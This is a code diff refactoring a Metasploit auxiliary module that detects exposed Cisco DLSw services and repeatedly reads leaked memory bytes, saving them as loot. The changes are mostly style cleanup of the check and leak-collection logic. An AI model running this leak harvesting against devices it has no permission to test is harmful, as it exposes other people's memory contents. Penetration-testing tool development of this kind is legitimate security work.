@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def peer
-    peer = "#{rhost}:#{rport}"
+    "#{rhost}:#{rport}"
   end
 
   def get_response(size = 8)
@@ -54,13 +54,24 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   # Called when using check
-  def check_host(ip)
-    print_status("Checking #{peer} for DLSw exposure")
+  def check_host(_ip)
+    print_status("#{peer}: Checking for DLSw exposure")
     response = get_response
-	
-    dlsw_header = ["3148015b"].pack("H*") # => "\x31\x48\x01\x5b""
-    if !response.blank? && (response[0..3] == dlsw_header)
-      print_good("#{peer}: Detected DLSw protocol")
+
+    if response.blank?
+      vprint_status("#{peer}: no response")
+      Exploit::CheckCode::Safe
+    elsif response[0..3] == "\x31\x48\x01\x5b"
+      vprint_good("#{peer}: Detected DLSw protocol")
+      report_service(
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        name: 'dlsw'
+      )
+      # TODO: check that response has something that truly indicates it is vulnerable
+      # and not simply that it responded
+      print_good("#{peer}: leaked #{response.length} bytes")
       report_vuln(
         host: rhost,
         port: rport,
@@ -70,11 +81,7 @@ class Metasploit3 < Msf::Auxiliary
       )
       Exploit::CheckCode::Vulnerable
     else
-      if response.blank?
-        vprint_status("#{peer}: no response")
-      else
-        vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
-      end
+      vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
       Exploit::CheckCode::Safe
     end
   end
@@ -86,9 +93,7 @@ class Metasploit3 < Msf::Auxiliary
     dlsw_data = ''
     until dlsw_data.length > datastore['LEAK_AMOUNT']
       response = get_response(72)
-      unless response.blank? 
-        dlsw_data << response[18..72]
-      end
+      dlsw_data << response[18..72] unless response.blank?
     end
     loot_and_report(dlsw_data)
   end
@@ -105,4 +110,3 @@ class Metasploit3 < Msf::Auxiliary
     print_status("#{peer}: DLSw leaked data stored in #{path}")
   end
 end
-
